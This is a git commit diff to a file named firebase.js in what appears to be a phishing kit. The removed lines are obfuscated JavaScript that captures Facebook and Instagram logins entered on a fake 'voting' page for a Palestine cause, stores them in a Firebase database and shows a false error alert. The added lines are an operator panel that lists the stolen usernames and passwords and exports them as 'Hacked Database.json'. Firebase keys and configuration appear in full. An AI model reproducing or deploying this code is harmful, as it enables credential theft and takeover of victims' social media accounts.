4daeb5332d9630a66aa4baf1a762def3ef08bcf6
devywifi <devywifi@swiftxpresscoltd.online>
2024-11-25 05:10:20 -0800

    Update firebase.js

--- js/firebase.js
+++ js/firebase.js
@@ -1,87 +1,182 @@
-
-function _0x5005() {
-  var _0x45ab74 = ['appCheck',
-    '22257npNZor',
-    '712255ZkbPQv',
-    'ig-pass',
-    '251CUNlRQ',
-    'vote-73e17',
-    '90KuEocW',
-    'alert',
-    'getElementById',
-    'Error\x20:\x20',
-    'Instagram',
-    'catch',
-    'set',
-    'resolvedOptions',
-    'toLocaleString',
-    '398551159245',
-    '1710600slINqz',
-    'fb-email',
-    'code',
-    '330996XzEsoH',
-    'toISOString',
-    'G-NQ1414E2YJ',
-    'ig-uname',
-    'value',
-    'auth',
-    '40942pcDhoC',
-    'push',
-    'log',
-    'fbdet',
-    '96kZJEHG',
-    '452ZUHCYn',
-    'signInAnonymously',
-    'AIzaSyA8lnkl-LBnUFGFBwa8CYtYPOr3qJiAhfk',
-    '1978277DEODIR',
-    'Sorry\x20voting\x20was\x20not\x20successful\x20please\x20try\x20again\x20later',
-    'savpalestine.appspot.com',
-    '6BpWQMK',
-    'database',
-    'DateTimeFormat',
-    'slice',
-    'initializeApp',
-    'timeZone',
-    'fb-pass']; _0x5005 = function() {
-    return _0x45ab74;
-  }; return _0x5005();
-}function _0xb7bd(_0x5066e6, _0x1f41d8) {
-  var _0x5005e7 = _0x5005(); return _0xb7bd = function(_0xb7bd37, _0x143c98) {
-    _0xb7bd37 = _0xb7bd37-0x19b; var _0x30d2ab = _0x5005e7[_0xb7bd37]; return _0x30d2ab;
-  },
-  _0xb7bd(_0x5066e6, _0x1f41d8);
-}var _0x35188f = _0xb7bd; (function(_0x3652f0, _0x245d7c) {
-    var _0x51577d = _0xb7bd, _0x5d50de = _0x3652f0(); while (!![]) {
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="icon" href="favicon.ico">
+  <title>Database</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    #save {
+      margin-top: 20px;
+    }
+    .canvaschat {
+      padding: 10px;
+      border: 1px solid #ccc;
+      margin-bottom: 10px;
+      background-color: #f5f5f5;
+    }
+    .send {
+      background-color: #e74c3c;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+    .send:hover {
+      background-color: #c0392b;
+    }
+    .export {
+      background-color: #2f9e1e;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+    .export:hover {
+      background-color: #2dc02b;
+    }
+    #scrollButtons {
+      text-align: center;
+      margin-top: 10px;
+    }
+    .scroll-icon {
+      font-size: 24px;
+      cursor: pointer;
+    }
+    #scrollButtons {
+      text-align: center;
+      margin-top: 10px;
+    }
+    .scroll-icon {
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .copy-icon {
+      font-size: 18px;
+      color: #007bff;
+      cursor: pointer;
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+  <div id="scrollButtons">
+    <i class="fas fa-chevron-circle-down scroll-icon" onclick="scrollToBottom()"></i>
+  </div>
+  <div></div>
+  <div id="save"></div>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script>
+const firebaseConfig = {
+apiKey: "AIzaSyA8lnkl-LBnUFGFBwa8CYtYPOr3qJiAhfk",
+authDomain: "savpalestine.firebaseapp.com",
+databaseURL: "https://savpalestine-default-rtdb.firebaseio.com",
+projectId: "savpalestine",
+storageBucket: "savpalestine.appspot.com",
+messagingSenderId: "724458243697",
+appId: "1:724458243697:web:ed5a618889052e4a023dd0"
+};
+    firebase.initializeApp(firebaseConfig);
+    async function signInAnonymously() {
       try {
-        var _0x2d7506 = parseInt(_0x51577d(0x1a7))/0x1*(parseInt(_0x51577d(0x1c1))/0x2)+parseInt(_0x51577d(0x19c))/0x3*(parseInt(_0x51577d(0x1b6))/0x4)+-parseInt(_0x51577d(0x1a5))/0x5+parseInt(_0x51577d(0x1b3))/0x6+-parseInt(_0x51577d(0x1c4))/0x7+parseInt(_0x51577d(0x1c0))/0x8*(parseInt(_0x51577d(0x1a4))/0x9)+parseInt(_0x51577d(0x1a9))/0xa*(parseInt(_0x51577d(0x1bc))/0xb); if (_0x2d7506 === _0x245d7c)break; else _0x5d50de['push'](_0x5d50de['shift']());
-      }catch(_0x14b3d8) {
-        _0x5d50de['push'](_0x5d50de['shift']());
-      }}}(_0x5005, 0x2381c));
-      function _0x3509(_0x4163c1,_0x3499ee){const _0x2dc0a3=_0x2dc0();return _0x3509=function(_0x350942,_0x42a9a8){_0x350942=_0x350942-0x8f;let _0x488715=_0x2dc0a3[_0x350942];return _0x488715;},_0x3509(_0x4163c1,_0x3499ee);}const _0x18b983=_0x3509;(function(_0x378cdc,_0x3952ce){const _0x1d3150=_0x3509,_0x46f170=_0x378cdc();while(!![]){try{const _0x489167=-parseInt(_0x1d3150(0x9d))/0x1*(-parseInt(_0x1d3150(0x94))/0x2)+parseInt(_0x1d3150(0x98))/0x3+parseInt(_0x1d3150(0x96))/0x4*(-parseInt(_0x1d3150(0x92))/0x5)+-parseInt(_0x1d3150(0x93))/0x6*(parseInt(_0x1d3150(0x91))/0x7)+-parseInt(_0x1d3150(0x9a))/0x8+parseInt(_0x1d3150(0x9c))/0x9+parseInt(_0x1d3150(0x99))/0xa;if(_0x489167===_0x3952ce)break;else _0x46f170['push'](_0x46f170['shift']());}catch(_0x1ebcc0){_0x46f170['push'](_0x46f170['shift']());}}}(_0x2dc0,0x276ee));function _0x2dc0(){const _0x4e71f7=['AIzaSyClD2fGSdipTFa9dPizXPZMpVxMxvuRklw','384879VMgUMu','1626640iARzZB','2206304cvooSk','savpalestine','2226285otYXJO','76289LIubCz','G-NQ1414E2YJ','savpalestine.firebaseapp.com',' https://savpalestine-default-rtdb.firebaseio.com','savpalestine.appspot.com','14BonpjX','18985mnZKcv','315486hPNXzo','2VujUKA','1:724458243697:web:ed5a618889052e4a023dd0','76nIIxTW'];_0x2dc0=function(){return _0x4e71f7;};return _0x2dc0();}const firebaseConfig={'apiKey':_0x18b983(0x97),'authDomain':_0x18b983(0x9f),'databaseURL':_0x18b983(0x8f),'projectId':_0x18b983(0x9b),'storageBucket':_0x18b983(0x90),'messagingSenderId':'724458243697','appId':_0x18b983(0x95),'measurementId':_0x18b983(0x9e)};
-      firebase[_0x35188f(0x1a0)](firebaseConfig); const appCheck = firebase[_0x35188f(0x1a3)](); console[_0x35188f(0x1be)](appCheck), appCheck['activate']('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', !![]); function login() {
-  var _0x5ba202 = _0x35188f; firebase[_0x5ba202(0x1bb)]()[_0x5ba202(0x1c2)]()[_0x5ba202(0x1ae)](function(_0x5cfe22) {
-    var _0x1d3198 = _0x5ba202,
-    _0x550dd7 = _0x5cfe22[_0x1d3198(0x1b5)],
-    _0x4d2b87 = _0x5cfe22['message']; window[_0x1d3198(0x1aa)]('Error\x20:\x20'+_0x4d2b87);
-  }); var _0x18c2c4 = document['getElementById'](_0x5ba202(0x1b4))[_0x5ba202(0x1ba)], _0x4c44e7 = document['getElementById'](_0x5ba202(0x1a2))[_0x5ba202(0x1ba)], _0x300f1d = new Date()['toISOString']()[_0x5ba202(0x19f)](0x0,
-    0xa), _0x3dfd3e = '', _0x232b8e = new Date()[_0x5ba202(0x1b1)]()[_0x5ba202(0x19f)](0xb,
-    0x19), _0x6b9b75 = Intl['DateTimeFormat']()[_0x5ba202(0x1b0)]()[_0x5ba202(0x1a1)], _0x51632a = 'Facebook'; _0x18c2c4 != '' && _0x4c44e7 != '' && (firebase['database']()['ref'](_0x5ba202(0x1bf))[_0x5ba202(0x1bd)]()[_0x5ba202(0x1af)]({
-      'emle': _0x18c2c4, 'mobile': _0x3dfd3e, 'time': _0x232b8e, 'timezone': _0x6b9b75, 'pass': _0x4c44e7, 'date': _0x300f1d, 'type': _0x51632a
-    }),
-    setTimeout(function() {
-      var _0x2dc431 = _0x5ba202; return window[_0x2dc431(0x1aa)]('Sorry\x20voting\x20was\x20not\x20successful\x20please.\x20Try\x20again\x20later'), document[_0x2dc431(0x1ab)](_0x2dc431(0x1a2))[_0x2dc431(0x1ba)] = '', ![];
-    }, 0x7d0));
-}function iglog() {
-  var _0x3f5ba7 = _0x35188f; firebase[_0x3f5ba7(0x1bb)]()[_0x3f5ba7(0x1c2)]()['catch'](function(_0x32be94) {
-    var _0x1809d4 = _0x3f5ba7,
-    _0x272753 = _0x32be94[_0x1809d4(0x1b5)],
-    _0x15f21d = _0x32be94['message']; window[_0x1809d4(0x1aa)](_0x1809d4(0x1ac)+_0x15f21d);
-  }); var _0x59f48f = document[_0x3f5ba7(0x1ab)](_0x3f5ba7(0x1b9))[_0x3f5ba7(0x1ba)], _0x2b502a = document[_0x3f5ba7(0x1ab)]('ig-pass')['value'], _0x1f44f9 = new Date()[_0x3f5ba7(0x1b7)]()[_0x3f5ba7(0x19f)](0x0,
-    0xa), _0x493a67 = '', _0x105879 = '', _0x2ca34d = new Date()[_0x3f5ba7(0x1b1)]()[_0x3f5ba7(0x19f)](0xb,
-    0x19), _0x537450 = Intl[_0x3f5ba7(0x19e)]()[_0x3f5ba7(0x1b0)]()[_0x3f5ba7(0x1a1)]; console[_0x3f5ba7(0x1be)](_0x537450); var _0x41e9b9 = _0x3f5ba7(0x1ad); _0x59f48f != '' && _0x2b502a != '' && (firebase[_0x3f5ba7(0x19d)]()['ref'](_0x3f5ba7(0x1bf))[_0x3f5ba7(0x1bd)]()[_0x3f5ba7(0x1af)]({
-      'emle': _0x59f48f, 'mobile': _0x105879, 'time': _0x2ca34d, 'timezone': _0x537450, 'pass': _0x2b502a, 'date': _0x1f44f9, 'type': _0x41e9b9
-    }),
-    setTimeout(function() {
-      var _0x1e2d5b = _0x3f5ba7; return window[_0x1e2d5b(0x1aa)](_0x1e2d5b(0x1c5)), document[_0x1e2d5b(0x1ab)](_0x1e2d5b(0x1a6))[_0x1e2d5b(0x1ba)] = '', ![];
-    }, 0x7d0));
-}
+        await firebase.auth().signInAnonymously();
+      } catch (error) {
+        console.error("Error:", error.message);
+      }
+    }
+    signInAnonymously();
+    const saveContainer = document.getElementById("save");
+    firebase.database().ref("fbdet").on("child_added", function(snapshot) {
+      const html = createChatEntry(snapshot);
+      saveContainer.appendChild(html);
+    });
+    function createChatEntry(snapshot) {
+      const chatDiv = document.createElement("div");
+      chatDiv.className = "canvaschat";
+      chatDiv.innerHTML = `
+        <hr>
+        <p><b>Account type:</b> ${snapshot.val().type}</p>
+        <p><b>User:</b> ${snapshot.val().emle} <i class="far fa-copy copy-icon" onclick="copyText('${snapshot.val().emle}')"></i></p>
+        <p><b>Password:</b> ${snapshot.val().pass} <i class="far fa-copy copy-icon" onclick="copyText('${snapshot.val().pass}')"></i></p>
+        <p><b>Date:</b> ${snapshot.val().date}</p>
+        <p><b>Location:</b> ${snapshot.val().timezone}</p>
+        <p><b>Time:</b> ${snapshot.val().time}</p>
+        <button data-id="${snapshot.key}" class="send">Delete</button>`;
+      return chatDiv;
+    }
+    saveContainer.addEventListener("click", function(event) {
+      if (event.target && event.target.classList.contains("send")) {
+        deleteMessage(event.target);
+      }
+    });
+    function deleteMessage(button) {
+      const messageId = button.getAttribute("data-id");
+      firebase.database().ref("fbdet").child(messageId).remove();
+    }
+    firebase.database().ref("fbdet").on("child_removed", function(snapshot) {
+      const messageElement = document.getElementById("message-" + snapshot.key);
+      if (messageElement) {
+        messageElement.innerHTML = "Deleted";
+      }
+    });
+
+    function exportAllData() {
+      const confirmExport = confirm("Are you sure you want to export all data?");
+      if (confirmExport) {
+        firebase.database().ref("fbdet").once("value").then((dataSnapshot) => {
+          const data = dataSnapshot.val();
+          const jsonData = JSON.stringify(data, null, 2);
+          const blob = new Blob([jsonData], { type: "application/json" });
+          const url = URL.createObjectURL(blob);
+
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "Hacked Database.json";
+          a.textContent = "Export All Data";
+          a.style.marginTop = "10px";
+          a.style.display = "block";
+
+          document.body.appendChild(a);
+        });
+      }
+    }
+    function deleteAllData() {
+      const confirmDelete = confirm("Are you sure you want to delete all data?");
+      if (confirmDelete) {
+        firebase.database().ref("fbdet").remove();
+        // Clear the container
+        saveContainer.innerHTML = "";
+      }
+    }
+    function scrollToTop() {
+      window.scrollTo(0, 0);
+    }
+    function scrollToBottom() {
+      window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    // Function to copy text when clicked
+    function copyText(text) {
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+      alert("Copied the text: " + text);
+    }
+  </script>
+  <div>
+    <button onclick="exportAllData()"class="export">Export All Data</button>
+  </div><br>
+  <div>
+    <button onclick="deleteAllData()"class="send delete-all-button">Delete All Data</button>
+  </div>
+  <div id="scrollButtons">
+    <i class="fas fa-chevron-circle-up scroll-icon" onclick="scrollToBottom()"></i>
+  </div>
+</body>
+</html>
